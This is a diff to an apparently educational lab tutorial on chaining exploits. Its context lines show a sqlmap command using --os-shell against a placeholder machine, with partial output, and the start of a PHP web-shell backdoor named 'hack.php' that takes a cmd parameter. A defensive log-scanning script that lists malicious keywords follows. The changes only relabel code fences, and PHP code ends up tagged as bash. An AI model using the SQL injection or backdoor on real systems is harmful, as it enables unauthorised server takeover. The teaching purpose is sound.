@@ -186,7 +186,7 @@ How to Chain Multiple ExploitsUsing a case study, let's dig deeper into various 
 - Now that he has the endpoint, it's time to exploit it using sqlmap. Bob copied the intercepted URL `http://MACHINE_IP/ai/includes/user_login.php?email=test%40chatai.com&password=123`, opened the Terminal, and executed the following command (**Note** : Enter `Y` if prompted and `4` to specify PHP as the supported language of the web server):
 
     AttackBox - Terminal  
-```AttackBox - Terminal 
+```bash
 thm@machine$ sqlmap -u "http://MACHINE_IP/ai/includes/user_login.php?email=test%40chatai.com&password=123" -p email --os-shell
 
 [00:43:50] [INFO] testing connection to the target URL
@@ -241,7 +241,7 @@ os-shell> whoami
 - The malicious file allows Bob to gain initial access to the server. Now Bob has opened avenues of exploitation for him, as he can upload any file on the server and execute it. He creates a simple PHP-based backdoor that will allow him to run any command on the server using the `cmd` parameter. Create a text file by copying the following code and saving it as `hack.php`.
 
     hack.php  
-```hack.php 
+```bash
 <?php
 if(isset($_REQUEST['cmd']))
 {
@@ -292,7 +292,7 @@ The above case study demonstrates how a simple vulnerability like an initial SQL
 You have seen how attackers can chain multiple vulnerabilities to exploit a system. Now, you will see how automation can help security engineers improve an organization's overall security posture. Without automation, tasks can be time-consuming and prone to human error. However, automating the processes helps the security engineer identify and remediate vulnerabilities more effectively, reducing the risk of a successful cyber attack on the organization's network. Several ways to automate these tasks include scripts, scheduling tools, and platforms that offer security orchestration, automation, and response (SOAR) capabilities.
 
 - **Scripts** : One way to automate everyday tasks and security checks is to use scripts. Scripting languages like Python, PowerShell, and Bash can automate many tasks, including system administration, security checks, and data analysis. Scripts can automate repetitive tasks, such as scanning for vulnerabilities, monitoring network traffic, and collecting log data. Additionally, scripts can be used to perform complex tasks, such as automating incident response procedures and analyzing large data sets. For example, you can create a small script in PHP to go through log files and identify any malicious URLs or keywords:    findKeywords.php  
-```findKeywords.php 
+```bash
 <?php
 
 $malicious_keywords = array('shell', 'apt', 'sql_error', 'hack'); // list of bad words
